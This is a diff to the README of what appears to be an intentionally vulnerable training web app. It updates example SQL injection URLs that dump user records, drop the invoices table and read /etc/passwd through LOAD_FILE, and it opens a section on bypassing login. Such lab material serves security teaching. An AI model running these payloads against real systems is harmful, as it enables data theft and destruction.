@@ -49,16 +49,15 @@ Examples of vulnerabilities in this web application include:
 In an SQL injection attack, malicious SQL statements are inserted into an entry field for execution (usually in a data-driven web application). 
 
 * Get information for all users: 
-    - `http://localhost/index.php?username=leocadio'%20or%20'1'='1`
-    - `http://localhost/index.php?username=leocadio'%20or%20''='`
-    - `http://localhost/index.php?id=1%20or%201=1`
+    - `http://localhost/customers.php?username=leocadio'%20or%20'1'='1`
+    - `http://localhost/customers.php?username=leocadio'%20or%20''='`
+    - `http://localhost/customers.php?id=1%20or%201=1`
 * Drop (destroy) invoices table: 
-    - `http://localhost/index.php?id=1;drop%20table%20invoices`
+    - `http://localhost/customers.php?id=1;drop%20table%20invoices`
 * Dump the password hash file from the server: 
-    - Unix: `http://localhost/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1`
-    - Windows: `http://localhost/index.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('C:\\secrets.txt'),'1`
+    - Unix: `http://localhost/customers.php?username='%20UNION%20SELECT%201,1,1,1,LOAD_FILE('/etc/passwd'),'1`
 * Dump several things at once (oh boy): 
-    - `http://localhost/index.php?username='%20UNION%20SELECT%201,2,3,4,5,'hello%20world`
+    - `http://localhost/customers.php?username='%20UNION%20SELECT%201,2,3,4,5,'hello%20world`
 
 ### Bypass Login (SQL Injection)
 It's possible to bypass login completely (logging in as whoever you like) by adding an always-true condition to the password check:
